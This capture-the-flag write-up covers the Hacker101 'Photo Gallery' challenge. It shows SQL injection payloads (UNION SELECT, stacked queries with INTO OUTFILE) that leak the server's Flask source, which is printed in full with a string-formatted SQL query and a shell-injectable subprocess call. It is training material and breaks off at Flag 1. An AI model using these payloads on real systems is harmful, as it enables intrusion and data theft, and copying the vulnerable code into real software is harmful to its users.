# Photo Gallery

Starting the challenge and going to the website we see the following:

![website](./helpfull_files/Photo_Gallery.png)

Ok, they are adorable, but where is the 3rd one?

--- 

## Flag 0 - Sneaky SQL injection

### Accessing the situation - part 1:

Let's see the network tab of developer tools:

![network](./helpfull_files/network.png)

The `500` status is interesting. Let's look into it further:

The request:
```
GET https://64b3a404931f79c97a19c4065979a7fd.ctf.hacker101.com/fetch?id=3

Host: 64b3a404931f79c97a19c4065979a7fd.ctf.hacker101.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://64b3a404931f79c97a19c4065979a7fd.ctf.hacker101.com/
Connection: keep-alive
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Cache-Control: max-age=0, no-cache
TE: trailers
Pragma: no-cache
```

The response's headers:
```
HTTP/2 500 Internal Server Error
date: Fri, 25 Mar 2022 11:24:34 GMT
content-type: text/html
content-length: 291
server: openresty/1.19.9.1
X-Firefox-Spdy: h2
```

Ok... So what?

I tried it with different ids (numbers or letters), but the server still responds with `500`.

Changing the method from GET to POST returns `405` (method not allowed), which doesn't hint to anything for now...

Lets take a look at the hints for this flag:

* Consider how you might build this system yourself. What would the query for fetch look like?

Ok... I would build it so that it didn't respond with `500` for not finding an image, or for anything for that matter. Nevertheless, the wording, especially the use of the word "query", is an interesting choice.

By *accidentally* clicking the hint button again, we take a quick glimpse of the second hint for this flag:

* Take a few minutes to consider the state of the union

Does it mean an SQL union?

### Attempt 1:

Let's try to find a way to inject some SQL. The command *might* look something like this:

```SQL
SELECT image_data FROM image_table WHERE id=%id
```

With the following payload we should get a response that should indicate if the system is vulnerable to such an attack:

`1 UNION SELECT * FROM INFORMATION_SCHEMA.TABLES`

to form:

```SQL
SELECT image_data FROM image_table WHERE id=1 UNION SELECT * FROM INFORMATION_SCHEMA.TABLES
```

After sending the request the server responds with the data for image with id=1 as if nothing happened. Ok... Let's try the id of the image that doesn't exist (for example id=3).

The server responds with the same `500` status error... Ok... great...

### Accessing the situation - part 2:

Let's see if nmap can shed some light. Using `nmap -T4 -A -v` on the ip of the server we get:

```
[...]

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http OpenResty web app server 1.19.9.1

[...]

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X (87%)
OS CPE: cpe:/o:linux:linux_kernel:4.2

[...]
```

Ok, only one open port, so there is no other point of entry. It is a linux machine, not sure how we can use this for leverage. The only thing that stands out to me (because it is the first time I see such a thing) is the `OpenResty web app server 1.19.9.1`. That is the same as the response header `server: openresty/1.19.9.1`. Let's find out what that is about.


Quoting the website:

```
OpenResty® is a full-fledged web platform that integrates our enhanced version of the Nginx core, our enhanced version of LuaJIT, many carefully written Lua libraries, lots of high quality 3rd-party Nginx modules, and most of their external dependencies. It is designed to help developers easily build scalable web applications, web services, and dynamic web gateways.

[...]

```

The website won't shut up about them using nginx... Is this information useful? Does this version have any well known vulnerabilities? Let's google it really quick...

*A few seconds later*

Oh... My... God... It has a LOT of severe vulnerabilities! Courtesy of [snyk.io](https://snyk.io/test/docker/openresty%2Fopenresty%3A1.19.9.1-centos7):

![snyk.io](./helpfull_files/vulnerabilities.png)


The three critical ones are all about `out-of-bounds write` that affect three modules ` nss`, ` nss-tools` and `nss-sysinit`. We may have use for this later (maybe has something to do with the `Space used: 0 total` message at the bottom of the website?).

There is one *new* report about an SQL injection for the module `cyrus-sasl-lib`! That is interesting! Let's read through it:

```
In Cyrus SASL 2.1.17 through 2.1.27 before 2.1.28, plugins/sql.c does not escape the password for a SQL INSERT or UPDATE statement.
```

So in skyk.io they pronounce SQL as *sequel*, judging by the use of "a" instead of "an".

Other than that this is some nice info to have, but I don't think it is useful for us for the time being...

Let's get back to the sql injection.

### Attempt 2:

The previous payload didn't return any results. Maybe the `UNION` keyword has a different use? Quoting [W3schools](https://www.w3schools.com/sql/sql_union.asp):

```
The UNION operator is used to combine the result-set of two or more SELECT statements.

* Every SELECT statement within UNION must have the same number of columns
* The columns must also have similar data types
* The columns in every SELECT statement must also be in the same order
```

That is interesting. `UNION` combines two `SELECT` statements that give **similar results**. That may be the reason that the injection didn't work before. We have to make it select  a file. But what file?

Is there a way to get a list of all the files?

### Accessing the situation - part 3:

First, let's try and see what happens with different inputs. We have tried other numbers like 1, 2, 3, etc and letters. We haven't tried negative numbers though. What about `-1`?

```
https://64b3a404931f79c97a19c4065979a7fd.ctf.hacker101.com/fetch?id=-1
```

The server responds with `404 - Not Found`.

Ok, this is new. This *might* mean that the SQL command got executed, but the backend responded with `404`.

Can it execute multiple SQL commands? The payload is: `-1; SELECT table_name FROM information_schema.tables INTO OUTFILE './temp.txt'; SELECT 'temp.txt'` to form:

```sql
SELECT image_data FROM image_table WHERE id=-1; SELECT table_name FROM information_schema.tables INTO OUTFILE './temp.txt'; SELECT 'temp.txt'
```

So that it fetches all the tables' names and saves them into the text file `temp.txt`, which then it reads.

The server responds with `404`. So the file was not created. The same happens with running the command in parts (one request to create the file, another to read it). This means that we probably cannot create a new file, we can only read those that already exist on the server.

It is time to take a look at the last hint for this flag:

* This application runs on the uwsgi-nginx-flask-docker image

Ok, let's see what does this image [contain](https://github.com/tiangolo/uwsgi-nginx-flask-docker):

```
[...]

Description

This Docker image allows you to create Flask web applications in Python that run with uWSGI and Nginx in a single container.

The combination of uWSGI with Nginx is a common way to deploy Python Flask web applications. It is widely used in the industry and would give you decent performance. (*)

[...]
```

and scrolling down to "General Instructions" we get an even better idea of what files this image may contain:

```
[...]

* Create an app directory and enter in it
* Create a main.py file (it should be named like that and should be in your app directory) with:

[...]

```

### Attempt 3:

So it is a webserver based on the flask python module and there might be a `main.py` file. So let's send this payload:

```
https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=-1; SELECT 'main.py'
```

`404`
What? Why? Oh, I forgot to use the `UNION`...

```
https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=-1 UNION SELECT main.py
```

`500`
What now...? Oh, I forgot the `'`


```
https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=-1 UNION SELECT 'main.py'
```
Finally, we get the source code...

```html
from flask import Flask, abort, redirect, request, Response
import base64, json, MySQLdb, os, re, subprocess

app = Flask(__name__)

home = '''
<!doctype html>
<html>
	<head>
		<title>Magical Image Gallery</title>
	</head>
	<body>
		<h1>Magical Image Gallery</h1>
$ALBUMS$
	</body>
</html>
'''

viewAlbum = '''
<!doctype html>
<html>
	<head>
		<title>$TITLE$ -- Magical Image Gallery</title>
	</head>
	<body>
		<h1>$TITLE$</h1>
$GALLERY$
	</body>
</html>
'''

def getDb():
	return MySQLdb.connect(host="localhost", user="root", password="", db="level5")

def sanitize(data):
	return data.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')

@app.route('/')
def index():
	cur = getDb().cursor()
	cur.execute('SELECT id, title FROM albums')
	albums = list(cur.fetchall())

	rep = ''
	for id, title in albums:
		rep += '<h2>%s</h2>\n' % sanitize(title)
		rep += '<div>'
		cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
		fns = []
		for pid, ptitle, pfn in cur.fetchall():
			rep += '<div><img src="fetch?id=%i" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
			fns.append(pfn)
		rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
		rep += '</div>\n'

	return home.replace('$ALBUMS$', rep)

@app.route('/fetch')
def fetch():
	cur = getDb().cursor()
	if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
		abort(404)

	# It's dangerous to go alone, take this:
	# ^FLAG^****************************************************************$FLAG$

	return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()

if __name__ == "__main__":
	app.run(host='0.0.0.0', port=80)
```

... and the flag!


### Notes:
* I don't know how would anyone guess that this is a python server without the hint. All the write ups for this just assume there is a `main.py` file. I guess this is a common thing to look for.



## Flag 1 - Never trust an invisible kitten


...
